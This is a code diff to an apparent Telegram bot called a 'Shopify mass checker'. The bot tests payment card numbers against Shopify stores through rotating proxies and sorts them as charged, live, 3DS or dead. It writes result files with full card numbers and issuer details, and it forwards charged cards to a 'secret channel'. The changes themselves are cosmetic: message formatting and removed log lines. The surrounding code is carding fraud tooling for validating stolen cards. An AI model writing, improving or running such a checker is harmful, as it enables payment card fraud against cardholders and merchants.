@@ -77,9 +77,8 @@ def _load_proxies():
                     raw = [l.strip() for l in f if l.strip() and not l.startswith(("#", "//", ";"))]
                 if raw:
                     lines = [_strip_proxy_scheme(p) for p in raw]; _ALL_PROXIES = lines; _PROXY_CACHE_TS = time.time()
-                    logging.info(f"[SH] {len(lines)} proxies loaded from {path}"); return lines
+                    return lines
             except: pass
-    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
     _ALL_PROXIES = []; _PROXY_CACHE_TS = time.time(); return []
 
 def _strip_scheme(url):
@@ -101,7 +100,7 @@ def _load_sites():
             raw = [l for l in raw if l]
             if raw:
                 _SITES_RAW_CACHE = raw; _SITES_RAW_TS = time.time(); res = list(raw); random.shuffle(res)
-                logging.info(f"[SH] {len(res)} sites loaded from {path}"); return res
+                return res
         except: pass
     raise RuntimeError("sites.txt not found or empty")
 
@@ -493,21 +492,22 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency, elapsed, us
     raw_resp = resp or "Unknown"; safe_resp = escape(raw_resp)
     ch_link = f'<a href="{CHANNEL_LINK}">Superman</a>'
     if verdict == "CHARGED":
-        status_line = "✦ <b>𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b> ✦"; gate_line = f"Shopify • {_fmt_price(price, currency)}"
+        status_line = "✦ <b>HIT ➛ CHARGED</b> 💎"; gate_line = f"Shopify • {_fmt_price(price, currency)}"
     elif verdict == "TDS":
-        status_line = "✦ <b>𝗛𝗜𝗧 𝗟𝗜𝗩𝗘 [3𝗗𝗦]</b> ✦"; gate_line = "Shopify"
+        status_line = "✦ <b>HIT ➛ LIVE [3DS]</b> 🟢"; gate_line = "Shopify"
     elif verdict == "LIVE":
-        status_line = "✦ <b>𝗛𝗜𝗧 𝗟𝗜𝗩𝗘</b> ✦"; gate_line = "Shopify"
+        status_line = "✦ <b>HIT ➛ LIVE</b> 🟢"; gate_line = "Shopify"
     else:
-        status_line = "✦ <b>𝗗𝗘𝗔𝗗 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</b> ✦"; gate_line = "Shopify"
-    return f"{status_line}\n━━━━━━━━━━━━━━━━━━━━\n💳 <b>𝗖𝗮𝗿𝗱</b>: <code>{escape(card)}</code>\n🛒 <b>𝗚𝗮𝘁𝗲</b>: {gate_line}\n━━━━━━━━━━━━━━━━━━━━\n✅ <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b>: {safe_resp}\n🏦 <b>𝗕𝗜𝗡</b>: {bin_s}\n━━━━━━━━━━━━━━━━━━━━\n⏱ <b>𝗧𝗶𝗺𝗲</b>: {ts}\n👤 <b>𝗨𝘀𝗲𝗿</b>: {ulink}\n⚡ <b>𝗕𝗼𝘁</b>: {ch_link}"
+        status_line = "✦ <b>DEAD ➛ DECLINED</b> 🔴"; gate_line = "Shopify"
+    return f"{status_line}\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n🪪 <b>Card</b>: <code>{escape(card)}</code>\n🛒 <b>Gate</b>: {gate_line}\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n💬 <b>Response</b>: {safe_resp}\n🏦 <b>BIN</b>: {bin_s}\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n⏱️ <b>Time</b>: {ts}\n👤 <b>User</b>: {ulink}\n🤖 <b>Bot</b>: {ch_link}"
 
 def _progress_text(sess: dict) -> str:
     ts = _fmt_time(time.time() - sess["start_time"])
     uobj = sess.get("user_obj")
     ulink = _user_link(uobj) if uobj else "User"
     ch_link = f'<a href="{CHANNEL_LINK}">Superman</a>'
-    return f"✦ <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b> ✦\n━━━━━━━━━━━━━━━━━━━━\n🛒 <b>𝗚𝗮𝘁𝗲</b>:  Shopify\n🔄 <b>𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀</b>: {sess['checked']} / {sess['total']}\n━━━━━━━━━━━━━━━━━━━━\n✅ <b>𝗟𝗶𝘃𝗲</b>:  {sess['approved']}\n❌ <b>𝗗𝗲𝗮𝗱</b>:  {sess['dead']}\n💎 <b>𝗖𝗵𝗮𝗿𝗴𝗲𝗱</b>: {sess['charged']}\n⚠️ <b>𝗘𝗿𝗿𝗼𝗿𝘀</b>: {sess['errors']}\n⏱ <b>𝗘𝗹𝗮𝗽𝘀𝗲𝗱</b>: {ts}\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>𝗨𝘀𝗲𝗿</b>: {ulink}\n⚡ <b>𝗕𝗼𝘁</b>: {ch_link}"
+    total = sess.get('total', 1); checked = sess.get('checked', 0); pct = int((checked / total) * 100) if total > 0 else 0
+    return f"✦ <b>SHOPIFY MASS CHECKER</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n🛒 <b>Gate</b>: Shopify 0-20$\n🔄 <b>Progress</b>: {checked} / {total} ({pct}%)\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n🟢 <b>Live</b>: {sess['approved']}\n🔴 <b>Dead</b>: {sess['dead']}\n💎 <b>Charged</b>: {sess['charged']}\n⚠️ <b>Errors</b>: {sess['errors']}\n⏱️ <b>Elapsed</b>: {ts}\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n👤 <b>User</b>: {ulink}\n🤖 <b>Bot</b>: {ch_link}"
 
 def _msh_buttons(sid: str, running: bool) -> RawMarkup:
     sess = MSH_SESSIONS.get(sid, {}); charged_n = sess.get("charged", 0); live_n = sess.get("approved", 0); all_n = sess.get("checked", 0)
@@ -533,13 +533,13 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
     elif kind == "dead": cards, label = sess.get("dead_cards", []), "Dead"
     else: cards = sess.get("charged_cards", []) + sess.get("live_cards", []) + sess.get("dead_cards", []) + sess.get("error_cards", []); label = "All"
     uname = (sess.get("user_obj") and (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"; plan = sess.get("plan", "TRIAL")
-    lines = ["Gate ➳ Shopify | 0-5 USD", f"Result ➳ {label}", f"Total ➳ {len(cards)}", f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "━━━━━━━━━━━━━━"]
+    lines = ["Gate ➳ Shopify | 0-5 USD", f"Result ➳ {label}", f"Total ➳ {len(cards)}", f"User ➳ {uname} ({plan})", f"Dev ➳ {BOT_NAME}", "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉"]
     for cd in cards:
         bi = cd.get("bin_info", {}); flag = bi.get("country_emoji", "🌍"); cdisp = f"{flag} {bi.get('country','N/A')}".strip()
         resp = cd.get("resp", cd.get("response", "N/A")) or "N/A"; ver = cd.get("verdict", "N/A"); prc = cd.get("price", "0.00"); cur = cd.get("currency", "USD")
         status = "Charged" if ver == "CHARGED" else "Live" if ver in ("LIVE","TDS") else "Dead" if ver == "DEAD" else "Error"
         raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
-        lines += [f"Card ➳ {cd.get('card','N/A')}", f"Status ➳ {status}", f"Gate ➳ Shopify | {prc} {cur}", f"Resp ➳ {raw_disp}", f"Brand ➳ {bi.get('scheme','N/A')}", f"Issuer ➳ {bi.get('bank','N/A')}", f"Country ➳ {cdisp}", "━━━━━━━━━━━━━━"]
+        lines += [f"Card ➳ {cd.get('card','N/A')}", f"Status ➳ {status}", f"Gate ➳ Shopify | {prc} {cur}", f"Resp ➳ {raw_disp}", f"Brand ➳ {bi.get('scheme','N/A')}", f"Issuer ➳ {bi.get('bank','N/A')}", f"Country ➳ {cdisp}", "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉"]
     buf = BytesIO("\n".join(lines).encode("utf-8")); buf.seek(0)
     return buf, f"Superman_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", len(cards)
 
@@ -548,15 +548,13 @@ async def _send_hit(bot, user, text: str, verdict: str, card: str = "", bin_data
     if verdict in ("LIVE", "TDS"): return
     eid = get_random_charged_emoji(); ulink = _user_link(user); resp_disp = escape(resp) if resp else "ORDER_PAID"
     gate_txt = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
-    log_html = f'<b>HIT ➛ CHARGED <tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n<b>{gate_txt}</b>\n<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> <code>{resp_disp}</code></b>\n<b>User ➛ {ulink} <tg-emoji emoji-id="{_plan_eid(plan)}">⭐</tg-emoji></b>'
-    log_kb = RawMarkup([[_btn("𝘽𝘼𝙏 ✘ 𝘾𝙃𝙆", url=BOT_USERNAME_LINK, style="primary")]])
     if not skip_dm:
         try: await _send_as_media(bot, user.id, eid, caption=text, parse_mode="HTML")
         except: pass
     if SECRET_CHANNEL_ID and verdict == "CHARGED":
         try:
             bin_s = escape(_bin_str_plain(bin_data))
-            sc_html = f"<b>HIT ➛ CHARGED 💎</b>\n<b>{gate_txt}</b>\n<b>──────────</b>\n<b>💳 <code>{escape(card)}</code></b>\n<b>🏦 {bin_s}</b>\n<b>──────────</b>\n<b>👤 {ulink} ⭐</b>\n<b>⚡ {DEV_LINK_HTML}</b>"
+            sc_html = f"<b>HIT ➛ CHARGED 💎</b>\n<b>{gate_txt}</b>\n<b>┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉</b>\n<b>🪪 <code>{escape(card)}</code></b>\n<b>🏦 {bin_s}</b>\n<b>┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉</b>\n<b>👤 {ulink} ⭐</b>\n<b>🤖 {DEV_LINK_HTML}</b>"
             await _send_as_media(bot, SECRET_CHANNEL_ID, eid, caption=sc_html, parse_mode="HTML", disable_notification=True)
         except: pass
 
